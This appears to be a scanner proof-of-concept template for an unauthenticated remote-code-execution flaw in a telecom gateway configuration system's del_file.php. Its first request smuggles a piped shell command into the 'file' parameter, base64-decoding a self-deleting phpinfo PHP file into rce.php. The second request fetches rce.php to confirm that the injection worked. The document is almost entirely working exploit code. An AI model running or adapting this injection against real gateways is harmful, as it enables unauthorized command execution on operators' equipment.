{
        'name': '电信网关配置管理系统 del_file.php 前台RCE漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=%20%7C%20base64%20-d%20%3E%20rce.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '/manager/newtpl/rce.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': False
        }}
        ]
    }